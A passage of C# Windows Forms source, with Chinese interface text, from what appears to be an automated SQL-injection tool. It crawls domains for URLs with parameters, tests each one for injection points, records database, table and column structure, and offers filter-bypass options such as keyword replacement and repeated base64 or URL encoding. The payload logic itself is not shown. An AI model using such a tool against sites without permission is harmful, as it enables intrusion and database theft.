                HashSet<String> addURLs = new HashSet<String>();
                do
                {

                    if (index >= s)
                    {
                        //不够数量继续爬行
                        if (count < config.maxSpiderCount)
                        {
                            String surl = GetOneURL(sp.AllURL, spindex);
                            if (!String.IsNullOrEmpty(surl)) {
                                sp.findLinks(surl);
                                spindex++;
                            }
                        }
                    }
    
                    String curl = GetOneURL(sp.AllURL, index);
                    if (curl.IndexOf("?") != -1)
                     {
                            this.Invoke(new StringDelegate(addItemToListBox), curl);
                            count++;
                     } 
                    index++;

                } while (count < config.maxScanCount&&sp.AllURL.Count> spindex) ;
                
            }
            catch (Exception e)
            {
                this.Invoke(new StringDelegate(log), "发生异常----" + e.Message);
            }

        }


        public void scanInject(Object ourl)
        {
            Injection injection = InjectionTools.testInjection(ourl.ToString(), this.config, this.scanInect_chk_scanError.Checked);
            if (injection.isInjection)
            {
                this.Invoke(new StringDelegate(log), ourl + "存在注入点！");
                injectionURLCount++;
                injection.url = ourl.ToString();
                injection.index = injectionURLCount;
                this.Invoke(new addScanInjectionResultDelegate(addScanInjectionResult), injection);
            }
            else
            {
                this.Invoke(new StringDelegate(log), ourl + "不存在注入点！");
            }


        }

        delegate void addScanInjectionResultDelegate(Injection inj);
        public void addScanInjectionResult(Injection inj)
        {

            ListViewItem lvi = new ListViewItem(inj.index + "");
            lvi.SubItems.Add(inj.url);
            lvi.SubItems.Add(inj.testUrl);
            lvi.SubItems.Add(inj.paramName);
            lvi.SubItems.Add(inj.injectType);
            lvi.SubItems.Add(inj.dbType);
            lvi.SubItems.Add(inj.remark);
            this.scanInjection_lvw_result.Items.Add(lvi);
        }

        public int scanedDomain = 0;
        private void timer_scanInjection_Tick(object sender, EventArgs e)
        {
            this.scanInjection_findURLSCount.Text = urlSumCount + "";
            this.scanInjection_scanedURLSCount.Text = scanedURLSCount + "";
            this.scanInjection_scanedDomainCount.Text = this.scanedDomain + "";
        }

        private void openScanURL(int index) {
            if (this.scanInjection_lvw_result.SelectedItems.Count == 0)
            {
                return;
            }
            string target = this.scanInjection_lvw_result.SelectedItems[0].SubItems[index].Text;

            try
            {

                System.Diagnostics.Process.Start("IEXPLORE.EXE", target);

            }
            catch (Exception oe)
            {
                MessageBox.Show("无法打开IE---" + oe.Message);
            }
        }

    

        private void scanInjection_lvw_result_DoubleClick(object sender, EventArgs e)
        {
            openScanURL(2);
        }

        private void scanInjection_cms_exportResult_Click(object sender, EventArgs e)
        {

            exportScanURL(null);
        }


        public void exportScanURL(int[] cols){
            if (export == 0)
            {
                //保存文件
                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Filter = "文本文件|*.txt";
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    export = 1;
                    exportInjectData(saveFileDialog.FileName,cols);   
                }
            }
            else
            {

                MessageBox.Show("请稍候，还有导出任务正在进行！");
            }
            export = 0;
        }

        public void exportInjectData(Object path,int[] cols)
        {
            try
            {
                FileStream fs = new FileStream(path.ToString(), FileMode.OpenOrCreate, FileAccess.Write);
                StreamWriter sw = new StreamWriter(fs);
                String columns = "";
                if (cols==null)
                {
                    foreach (ColumnHeader dc in this.scanInjection_lvw_result.Columns)
                    {
                        columns += (dc.Text + "#");
                    }
                    sw.WriteLine(columns);
                }
               
                foreach (ListViewItem sv in this.scanInjection_lvw_result.Items)
                {
                    StringBuilder sb = new StringBuilder();
                    if (cols == null)
                    {
                        foreach (ListViewItem.ListViewSubItem subv in sv.SubItems)
                        {

                            sb.Append(subv.Text);
                            sb.Append("----");
                        }
                    }
                    else {
                       
                     
                            for (int i=0;i< cols.Length;i++)
                            {
                                sb.Append(sv.SubItems[cols[i]].Text);
                                sb.Append("----");
                            }
                     }
                    
                    sb.Remove(sb.Length - 4, 4);
                    sw.WriteLine(sb.ToString());
                }
                sw.Close();
                MessageBox.Show("导出完成！");
            }
            catch (Exception e)
            {
                Tools.SysLog("导出数据发生异常！" + e.Message);
                MessageBox.Show("导出数据发生异常！");
            }
            export = 0;

        }

        private void scanInjection_cms_copyURL_Click(object sender, EventArgs e)
        {
            if (this.scanInjection_lvw_result.SelectedItems.Count == 0)
            {
                return;
            }
            Clipboard.SetText(this.scanInjection_lvw_result.SelectedItems[0].SubItems[1].Text);
            MessageBox.Show("复制成功！");
        }

        private void scanInjection_cms_delThisLine_Click(object sender, EventArgs e)
        {
            if (this.scanInjection_lvw_result.SelectedItems.Count == 0)
            {
                return;
            }
            foreach (ListViewItem selitem in this.scanInjection_lvw_result.SelectedItems) {
                this.scanInjection_lvw_result.Items.Remove(selitem);
            }
        }

        private void scanInjection_cms_clearResult_Click(object sender, EventArgs e)
        {
            this.scanInjection_lvw_result.Items.Clear();
        }

        public void loadList(Object path)
        {
            //load
            FileStream fs_dir = null;
            StreamReader reader = null;
            urlSumCount = 0;
            try
            {
                fs_dir = new FileStream(path.ToString(), FileMode.Open, FileAccess.Read);

                reader = new StreamReader(fs_dir);

                String lineStr;

                while ((lineStr = reader.ReadLine()) != null)
                {
                    this.Invoke(new StringDelegate(addItemToListBox), lineStr);
                    urlSumCount++;
                }
            }
            catch (Exception e)
            {
                Tools.SysLog(e.Message);
            }
            finally
            {
                if (reader != null)
                {
                    reader.Close();
                }
                if (fs_dir != null)
                {
                    fs_dir.Close();
                }
                loadListStatus = 0;
            }

        }
        public void addItemToListBox(String item)
        {
            if (!this.scanInject_lsb_links.Items.Contains(item)) {
                this.scanInject_lsb_links.Items.Add(item);
                urlSumCount++;
            }   
        }

        private void scanInjection_txtURLList_DoubleClick(object sender, EventArgs e)
        {
            if (loadListStatus == 0)
            {
                OpenFileDialog ofd = new OpenFileDialog { Filter = "文本文件(*.txt)|*.txt" };
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    this.scanInject_lsb_links.Items.Clear();
                    Thread th = new Thread(loadList);
                    loadListStatus = 1;
                    th.Start(ofd.FileName);
                }
            }
            else
            {
                MessageBox.Show("上次导入任务还未结束，请稍后！");
            }
        }

        private void encode_txt_encode_TextChanged(object sender, EventArgs e)
        {
            md5();
        }

        private void md5()
        {
            if (this.encode_cbox_encode.SelectedIndex == 5)
            {
                this.encode_txt_result.Text = "16位md5：" + Tools.md5_16(this.encode_txt_input.Text) + "\r\n32位md5：" + Tools.md5_32(this.encode_txt_input.Text);
                this.encode_txt_result.Text += "\r\n小写16位md5：" + Tools.md5_16(this.encode_txt_input.Text).ToLower() + "\r\n小写32位md5：" + Tools.md5_32(this.encode_txt_input.Text).ToLower();
            }
        }

        private void log_lvw_httpLog_SelectedIndexChanged(object sender, EventArgs e)
        {
            if (this.log_lvw_httpLog.SelectedItems.Count > 0)
            {
                try
                {
                    String tag = this.log_lvw_httpLog.SelectedItems[0].Tag.ToString();
                    this.log_txt_request.Text = FileTool.readFileToString(Tools.httpLogPath + tag + "-request.txt");
                    String response = FileTool.readFileToString(Tools.httpLogPath + tag + "-response.txt");
                    if (!String.IsNullOrEmpty(response))
                    {
                        int index = response.IndexOf("\r\n\r\n");

                        if (index != -1)
                        {
                            this.webBro_log.Stop();
                            this.webBro_log.ScriptErrorsSuppressed = true;
                            this.log_txt_response.Text = response;
                            String html = response.Substring(index, response.Length - index);
                            this.webBro_log.DocumentText = html;
                        }


                    }
                    else
                    {
                        MessageBox.Show("没有读到详细HTTP日志，可能上一次清除记录时已清除！");
                    }
                }
                catch (Exception ee)
                {
                    Tools.SysLog("查看详细HTTP日志，发生异常----" + ee.Message);
                }
            }
        }

        private ListViewColumnSorter data_dbs_lvw_lvwColumnSorter;
        private bool sort = false;
        private void data_dbs_lvw_data_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // 创建一个ListView排序类的对象，并设置listView1的排序器
            data_dbs_lvw_lvwColumnSorter = new ListViewColumnSorter();
            if (sort == false)
            {
                sort = true;
                data_dbs_lvw_lvwColumnSorter.Order = SortOrder.Descending;
            }
            else
            {
                sort = false;
                data_dbs_lvw_lvwColumnSorter.Order = SortOrder.Ascending;
            }
            data_dbs_lvw_lvwColumnSorter.SortColumn = e.Column;
            this.data_dbs_lvw_data.ListViewItemSorter = data_dbs_lvw_lvwColumnSorter;
        }

        private ListViewColumnSorter scanInjection_lvw_result_lvwColumnSorter;
        private bool ss_sort = false;
        private void scanInjection_lvw_result_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // 创建一个ListView排序类的对象，并设置listView1的排序器
            scanInjection_lvw_result_lvwColumnSorter = new ListViewColumnSorter();

            if (ss_sort == false)
            {
                ss_sort = true;
                scanInjection_lvw_result_lvwColumnSorter.Order = SortOrder.Descending;
            }
            else
            {
                ss_sort = false;
                scanInjection_lvw_result_lvwColumnSorter.Order = SortOrder.Ascending;
            }
            scanInjection_lvw_result_lvwColumnSorter.SortColumn = e.Column;
            this.scanInjection_lvw_result.ListViewItemSorter = scanInjection_lvw_result_lvwColumnSorter;
        }

        private void btn_inject_clearRequest_Click(object sender, EventArgs e)
        {
            this.mytab.SelectTab(1);
            data_cms_tsmi_getVariable_Click(null, null);
        }

        private void file_txt_result_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
            {
                ((TextBox)sender).SelectAll();
            }
        }

        private void cmd_txt_result_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
            {
                ((TextBox)sender).SelectAll();
            }
        }

        private void encode_txt_result_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
            {
                ((TextBox)sender).SelectAll();
            }
        }

        private void bypass_chk_base64_CheckedChanged(object sender, EventArgs e)
        {
            config.base64 = this.bypass_chk_base64.Checked;
        }

        private void data_dbs_tsmi_addDBS_Click(object sender, EventArgs e)
        {
            addNode(1);

        }

        private void addNode(int type)
        {

            if (an != null)
            {
                an = new AddNode();
                an.type = type;
                an.tn = this.data_tvw_dbs.SelectedNode;
                an.tvw = this.data_tvw_dbs;
                an.ShowDialog();
            }
            else
            {
                an = new AddNode();
                an.type = type;
                an.tvw = this.data_tvw_dbs;
                an.tn = this.data_tvw_dbs.SelectedNode;
                an.ShowDialog();
            }

        }

        private void data_dbs_tsmi_addTableOrColumn_Click(object sender, EventArgs e)
        {
            addNode(2);
        }
        private Thread spiderThread = null;
        private void scanInjection_btn_spider_Click(object sender, EventArgs e)
        {
            if (addStatus != 0) {
                MessageBox.Show("请稍候，还在加载地址列表！");
                return;
            }
            if (this.scanInjection_btn_spider.Text.Equals("爬行链接"))
            {
                if (scan_list.Count <= 0)
                {
                    MessageBox.Show("请导入域名！");
                    return;
                }
                if (MyThreadPool.getCurrentThreadCount() > 0)
                {
                    MessageBox.Show("请稍候还有后台线程正在运行！");
                    return;
                }
                this.scanInject_lsb_links.Items.Clear();
                spiderThread = new Thread(spider);
                scanedDomain = 0;
                this.scanInjection_btn_spider.Text = "停止爬行";
                Main.status = 1;
                spiderThread.Start();

            }

            else
            {
                if (this.spiderThread != null)
                {
                    this.spiderThread.Abort();
                    Thread t = new Thread(stopSpider);
                    t.Start();
                }
            }
        }

        private void scanInjection_btn_scan_Click(object sender, EventArgs e)
        {
            if (addStatus != 0)
            {
                MessageBox.Show("请稍候，还在加载地址列表！");
                return;
            }
            if (MyThreadPool.getCurrentThreadCount() <= 0)  
            {
                if (this.scanInject_lsb_links.Items.Count > 0)
                {

                    scanedURLSCount = 0;
                    this.scanInjection_btn_scan.Text = "停止扫描";
                    Main.status = 1;
                    scanedThread = new Thread(scan);
                    scanedThread.Start();
                }
                else {
                    MessageBox.Show("请先爬行或导入链接！");
                } 
            }  
            else
            {
               
                if (this.scanedThread != null)
                {
                    this.scanedThread.Abort();
                    Thread t = new Thread(stopScan);
                    t.Start();
                }
            }
        }
        private ListViewColumnSorter log_lvw_httpLog_lvwColumnSorter;
        private bool log_sort = false;
        private void log_lvw_httpLog_ColumnClick(object sender, ColumnClickEventArgs e)
        {
            // 创建一个ListView排序类的对象，并设置listView1的排序器
            log_lvw_httpLog_lvwColumnSorter = new ListViewColumnSorter();
            if (log_sort == false)
            {
                log_sort = true;
                log_lvw_httpLog_lvwColumnSorter.Order = SortOrder.Descending;
            }
            else
            {
                log_sort = false;
                log_lvw_httpLog_lvwColumnSorter.Order = SortOrder.Ascending;
            }
            log_lvw_httpLog_lvwColumnSorter.SortColumn = e.Column;
            this.log_lvw_httpLog.ListViewItemSorter = log_lvw_httpLog_lvwColumnSorter;
        }

        private void cbox_basic_timeOut_TextChanged(object sender, EventArgs e)
        {
            config.timeOut = int.Parse(this.cbox_basic_timeOut.Text);
        }

        private void cbox_basic_encoding_TextChanged(object sender, EventArgs e)
        {
            config.encoding = this.cbox_basic_encoding.Text;
        }

        private void cbox_basic_threadSize_TextChanged(object sender, EventArgs e)
        {
            config.threadSize = int.Parse(this.cbox_basic_threadSize.Text);
            MyThreadPool.setMaxThread(config.threadSize);
        }

        private void cbox_basic_reTryCount_TextChanged(object sender, EventArgs e)
        {
            config.reTry = int.Parse(this.cbox_basic_reTryCount.Text);
        }

        private void tsmi_exportScanInjectionURL_Click(object sender, EventArgs e)
        {
            try
            {
                //保存文件
                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Filter = "文本文件|*.txt";
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    FileStream fs = new FileStream(saveFileDialog.FileName.ToString(), FileMode.OpenOrCreate, FileAccess.Write);
                    StreamWriter sw = new StreamWriter(fs);
                    foreach (String url in this.scanInject_lsb_links.Items)
                    {
                        sw.WriteLine(url);
                    }
                    sw.Close();
                    MessageBox.Show("导出完成！");
                }

            }
            catch (Exception ee)
            {

                MessageBox.Show("导出异常！" + ee.Message);

            }

        }

        private void tsmi_clearScanInjectionURL_Click(object sender, EventArgs e)
        {
            this.scanInject_lsb_links.Items.Clear();
            this.scan_list.Clear();
            this.scanInjection_domainsCount.Text = "0";
            this.urlSumCount = 0;//待扫url
            this.scanedURLSCount = 0;//已扫
            this.scanedDomain = 0;//爬行到URL

        }

        private void encode_txt_input_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Modifiers == Keys.Control && e.KeyCode == Keys.A)
            {
                ((TextBox)sender).SelectAll();
            }
        }

        private void tsmi_readme_Click(object sender, EventArgs e)
        {
            MessageBox.Show("查看程序包！");
        }

        private void cbox_file_readFileEncoding_SelectedValueChanged(object sender, EventArgs e)
        {
            config.readFileEncoding = this.cbox_file_readFileEncoding.Text;
        }

        private void toolStrip1_TextChanged(object sender, EventArgs e)
        {
            config.db_encoding = this.data_dbs_cob_db_encoding.Text;
        }

        private void 版本ToolStripMenuItem_Click(object sender, EventArgs e)
        {
            MessageBox.Show("V1.0正式版----" + version);
        }

        private void data_dbs_tsmi_saveDTCStruct_Click(object sender, EventArgs e)
        {
            try
            {
                DataBase dbs = new DataBase();
                SerializableDictionary<String, SerializableDictionary<String, List<String>>> db_tables = new SerializableDictionary<String, SerializableDictionary<String, List<String>>>();
                foreach (TreeNode db in this.data_tvw_dbs.Nodes)
                {
                    SerializableDictionary<String, List<String>> stable = new SerializableDictionary<String, List<String>>();
                    if (db.Nodes.Count <= 0)
                    {
                        stable.Add("", new List<String>());
                    }
                    foreach (TreeNode table in db.Nodes)
                    {
                        List<String> columns = new List<String>();
                        foreach (TreeNode column in table.Nodes)
                        {
                            columns.Add(column.Text);
                        }
                        stable.Add(table.Text, columns);
                    }
                    db_tables.Add(db.Text, stable);
                }
                dbs.tables = db_tables;
                //保存文件
                SaveFileDialog saveFileDialog = new SaveFileDialog();
                saveFileDialog.Filter = "文本文件|*.xml";
                if (saveFileDialog.ShowDialog() == DialogResult.OK)
                {
                    export = 1;
                    Thread eth = new Thread(exportData);
                }
                XML.saveDBS(saveFileDialog.FileName, dbs);
                MessageBox.Show("保存成功！");
            }
            catch (Exception ke)
            {

                log("\r\n加载异常----" + ke.Message + "\r\n");
            }
        }

        private void data_dbs_tsmi_loadDTCStruct_Click(object sender, EventArgs e)
        {
            try
            {
                OpenFileDialog ofd = new OpenFileDialog { Filter = "XML文件(*.xml)|*.*" };
                if (ofd.ShowDialog() == DialogResult.OK)
                {

                    DataBase dbs = XML.readDBS(ofd.FileName);
                    foreach (KeyValuePair<String, SerializableDictionary<String, List<String>>> sdb in dbs.tables)
                    {
                        if (Tools.isExistsNode(this.data_tvw_dbs.Nodes, sdb.Key))
                        {
                            log("数据库" + sdb.Key + "已在列表中，无法再次添加如果要添加请先删除原数据库！");
                            continue;
                        }
                        TreeNode dbtn = new TreeNode(sdb.Key);
                        dbtn.Tag = "dbs";
                        foreach (KeyValuePair<String, List<String>> tables in sdb.Value)
                        {
                            if (String.IsNullOrEmpty(tables.Key))
                            {
                                continue;
                            }
                            TreeNode tabletn = new TreeNode(tables.Key);
                            tabletn.Tag = "table";
                            dbtn.Nodes.Add(tabletn);
                            foreach (String column in tables.Value)
                            {
                                if (String.IsNullOrEmpty(column))
                                {
                                    continue;
                                }
                                TreeNode columntn = new TreeNode(column);
                                columntn.Tag = "column";
                                tabletn.Nodes.Add(columntn);
                            }
                        }
                        this.data_tvw_dbs.Nodes.Add(dbtn);
                    }
                    MessageBox.Show("加载库表列信息成功！");
                }
            }
            catch (Exception ke)
            {

                log("\r\n加载异常----" + ke.Message + "\r\n");
            }
        }

        private void data_dbs_tsmi_clearDTCStruct_Click(object sender, EventArgs e)
        {
            this.data_tvw_dbs.Nodes.Clear();
        }

        private void cbox_inject_type_SelectedIndexChanged(object sender, EventArgs e)
        {
            int c = this.cbox_inject_type.SelectedIndex;
            switch (c)
            {
                case 0:
                    config.keyType = KeyType.Key;
                    break;
                case 1:
                    config.keyType = KeyType.Code;
                    break;
                case 2:
                    config.keyType = KeyType.Length;
                    break;
                case 3:
                    config.keyType = KeyType.Time;
                    break;

            }
        }

        private void tsmi_createGetTemplate_Click(object sender, EventArgs e)
        {
            this.txt_inject_request.Text = HTTP.getTemplate;
        }

        private void tsmi_createPOSTTemplate_Click(object sender, EventArgs e)
        {
            this.txt_inject_request.Text = HTTP.postTemplate;
        }

        private void tsmi_changeRequestMethod_Click(object sender, EventArgs e)
        {
            this.txt_inject_request.Text = Tools.changeRequestMethod(this.txt_inject_request.Text);
        }

        private void tsmi_clearColumns_Click(object sender, EventArgs e)
        {
            this.data_dbs_lvw_data.Clear();
        }

        private void tsmi_bugReport_Click(object sender, EventArgs e)
        {
            MessageBox.Show("邮箱反馈：1341413415@qq.com\r\nQQ群反馈：84978967");
        }

        private void data_dbs_cob_db_encoding_TextChanged(object sender, EventArgs e)
        {
            this.config.db_encoding = this.data_dbs_cob_db_encoding.Text;
        }

        private void cob_keyRepalce_SelectedIndexChanged(object sender, EventArgs e)
        {
            config.keyReplace = this.cob_keyRepalce.SelectedIndex;
        }

        private void chk_reaplaceBeforURLEncode_CheckedChanged(object sender, EventArgs e)
        {
            config.reaplaceBeforURLEncode = this.chk_reaplaceBeforURLEncode.Checked;
        }

        private void tsmi_createPackByURL_Click(object sender, EventArgs e)
        {
            try {
                Uri url = new Uri(config.request);
                this.txt_inject_request.Text=Spider.reqestGetTemplate.Replace("{url}", url.PathAndQuery).Replace("{host}", url.Host+":"+ url.Port);
                this.txt_basic_host.Text = url.Host;
                this.txt_basic_port.Text = url.Port.ToString();
                if (config.request.StartsWith("https")) {
                    this.chk_useSSL.Checked = true;
                }
            }catch (Exception ee) {
                MessageBox.Show("请在数据包中输入正确的URL地址，如：http://www.baidu.com/index.php?id=1");
            }
            
        }

        private void tsmi_tsmi_opentestURL_Click(object sender, EventArgs e)
        {
            openScanURL(2);
        }

        private void tsmi_openURL_Click(object sender, EventArgs e)
        {
            openScanURL(1);
        }

        private void bypass_btn_saveTemplate_Click(object sender, EventArgs e)
        {
            SaveFileDialog saveFileDialog = new SaveFileDialog();
            saveFileDialog.Filter = "XML文件|*.xml";
            if (saveFileDialog.ShowDialog() == DialogResult.OK)
            {
                XML.saveConfig(saveFileDialog.FileName, config);
                MessageBox.Show("保存模板成功！");
            }
        }

        public void loadTemplate(String templatePath) {
            try
            {
                Config template = XML.readConfig(templatePath);

                //bypass
                this.bypass_chk_inculdeStr.Checked = template.inculdeStr;
                this.cob_keyRepalce.SelectedIndex = template.keyReplace;
                this.bypass_chk_base64.Checked = template.base64;
                this.cbox_base64Count.SelectedIndex = config.base64Count;
                //替换字符
                this.chk_reaplaceBeforURLEncode.Checked = template.reaplaceBeforURLEncode;
                String[] replaceStrs = Regex.Split(template.replaceStrs, "\\n");
                if (replaceStrs.Length > 0)
                {
                    foreach (String line in replaceStrs)
                    {
                        String[] strs = Regex.Split(line, "\\t");
                        if (strs.Length == 2)
                        {
                            if (!String.IsNullOrEmpty(strs[0])&& !replaceList.ContainsKey(strs[0]))
                            {
                                this.replaceList.Add(strs[0], strs[1]);
                                ListViewItem lvi = new ListViewItem(strs[0]);
                                lvi.SubItems.Add(strs[1]);
                                lvi.Name = strs[1];
                                this.bypass_lvw_replaceString.Items.Add(lvi);
                                config.replaceStrs += (strs[0] + "\t" + strs[1] + "\n");
                            }
                        }
                    }
                }
                MessageBox.Show("加载模板完成！");

            }
            catch (Exception e)
            {
                Tools.SysLog("加载模板发生异常！"+e.Message);
                MessageBox.Show("加载模板发生异常！");
            }   
        }

        private void bypass_cbox_loadTemplate_TextChanged(object sender, EventArgs e)
        {
            if (this.bypass_cbox_loadTemplate.SelectedIndex == 0)
            {
                OpenFileDialog ofd = new OpenFileDialog { Filter = "XML文件(*.xml)|*.*" };
                if (ofd.ShowDialog() == DialogResult.OK)
                {
                    loadTemplate(ofd.FileName);
                }
            }
            else {
                String path = AppDomain.CurrentDomain.BaseDirectory + "/config/template/" + this.bypass_cbox_loadTemplate.Text;
                loadTemplate(path);

            }
        }

        private void cbox_base64Count_TextChanged(object sender, EventArgs e)
        {
            config.base64Count = this.cbox_base64Count.SelectedIndex+1;
        }

        private void tsmi_tsmi_exortTestURL_Click(object sender, EventArgs e)
        {
            exportScanURL(new int[] { 2});
        }

        private void tsmi_tsmi_exortOldURL_Click(object sender, EventArgs e)
        {
            exportScanURL(new int[] {1});
        }

        private void cbox_bypass_urlencode_count_TextChanged(object sender, EventArgs e)
        {
            config.urlencodeCount = this.cbox_bypass_urlencode_count.SelectedIndex + 1;
        }
    }
}